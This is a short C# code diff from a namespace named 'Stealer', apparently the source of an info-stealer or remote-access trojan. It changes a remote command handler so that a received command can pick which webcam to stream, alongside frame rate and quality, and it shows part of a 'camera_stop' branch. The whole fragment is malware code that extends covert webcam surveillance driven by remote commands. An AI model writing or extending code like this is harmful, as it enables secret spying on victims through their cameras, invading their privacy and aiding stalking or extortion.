@@ -84,10 +84,12 @@ namespace Stealer
             {
                 int fps = 5;
                 int quality = 50;
+                int camIndex = 0;
                 string[] parts = cmd.Split(':');
                 if (parts.Length >= 2) int.TryParse(parts[1], out fps);
                 if (parts.Length >= 3) int.TryParse(parts[2], out quality);
-                CameraStream.Start(fps, quality);
+                if (parts.Length >= 4) int.TryParse(parts[3], out camIndex);
+                CameraStream.Start(fps, quality, camIndex);
             }
             else if (cmdLower == "camera_stop")
             {
